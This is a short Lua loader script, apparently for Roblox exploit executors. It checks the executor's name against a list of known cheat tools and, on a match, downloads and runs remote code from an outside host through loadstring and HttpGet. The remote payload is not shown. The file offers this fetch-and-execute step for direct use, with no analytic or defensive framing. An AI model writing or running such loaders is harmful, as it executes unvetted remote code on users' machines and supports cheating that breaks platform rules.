_G.Execs = {"Potassium","Strikes", "Chocosploit", "Volt", "Seliware", "Volcano", "Macsploit", "Hydrogen"}
_G.Name = identifyexecutor()
_G.meowmeow = function()
    for _, v in next, _G.Execs do
        if _G.Name:find(v) then 
            loadstring(game:HttpGet('https://api.getpolsec.com/scripts/hosted/343807ce8ba9db5866deeb12d4f235612d7a72e7119276bdcb63896effe69846.lua'))();
            return true 
        end
    end
    warn('executor_unsupported')
end
_G.meowmeow()
